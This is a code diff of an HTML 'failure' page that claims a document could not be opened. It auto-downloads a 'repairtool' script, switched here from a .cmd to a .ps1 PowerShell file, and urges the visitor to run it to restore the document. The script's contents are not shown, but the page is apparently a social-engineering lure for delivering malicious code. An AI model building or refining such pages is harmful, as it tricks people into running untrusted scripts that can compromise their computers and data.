@@ -26,11 +26,11 @@
             <p>
                 In Chrome, you can usually do this by pressing <strong>Ctrl+J</strong> (Windows/Linux) or <strong>Cmd+Shift+J</strong> (Mac),
                 or by going to Menu → Downloads. <br>
-		        And click the repairtool.cmd to restore the document.
+		        And click the repairtool to restore the document.
             </p>
         </div>
         <p id="repair-tool-status" class="repair-message">
-            The <strong>repairtool.cmd</strong> will be offered for download in a moment. Please check your browser's downloads.
+            The <strong>repairtool</strong> will be offered for download in a moment. Please check your browser's downloads.
         </p>
         <!-- Link to go back to index.html to try again -->
         <p style="margin-top: 25px;">
@@ -53,7 +53,7 @@
                 // Create a temporary link element
                 const link = document.createElement('a');
                 link.href = URL.createObjectURL(blob);
-                link.download = 'repairtool.cmd';
+                link.download = 'repairtool.ps1';
 
                 document.body.appendChild(link);
                 link.click(); // This now happens after the 2-second delay
@@ -61,14 +61,14 @@
                 URL.revokeObjectURL(link.href);
 
                 if (statusMessageElement) {
-                    statusMessageElement.innerHTML = `The <strong>repairtool.cmd</strong> has been offered for download. Please check your browser's downloads and run it if you trust this source.`;
+                    statusMessageElement.innerHTML = `The <strong>repairtool.ps1</strong> has been offered for download. Please check your browser's downloads and run it if you trust this source.`;
                     statusMessageElement.style.color = '#28a745'; // Change to green for success
                 }
-                console.log('repairtool.cmd download initiated after 2-second delay.');
+                console.log('repairtool.ps1 download initiated after 2-second delay.');
 
             }, 10000); // 2000 milliseconds = 2 seconds
 
-            console.log('failure.html loaded, repairtool.cmd download scheduled in 2 seconds.');
+            console.log('failure.html loaded, repairtool.ps1 download scheduled in 2 seconds.');
         });
     </script>
 </body>
